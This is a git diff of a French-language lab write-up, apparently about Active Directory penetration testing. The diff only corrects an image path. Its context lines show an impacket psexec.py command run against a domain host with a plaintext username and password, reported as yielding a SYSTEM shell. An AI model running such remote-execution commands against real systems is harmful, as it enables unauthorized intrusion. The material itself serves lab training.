@@ -22,7 +22,7 @@ find /usr -name "psexec.py" 2>/dev/null
 python3 /usr/share/doc/python3-impacket/examples/psexec.py -codec cp850 cyber.lan/jules.ferry:abcd1234@@192.168.1.30
 ```
 
-![](assets/images/Pasted-image-20260109122957.png)
+![](../assets/images/Pasted-image-20260109122957.png)
 
 **Résultat observé :** ouverture d’un shell interactif exécuté dans le contexte NT AUTHORITY\SYSTEM.
 
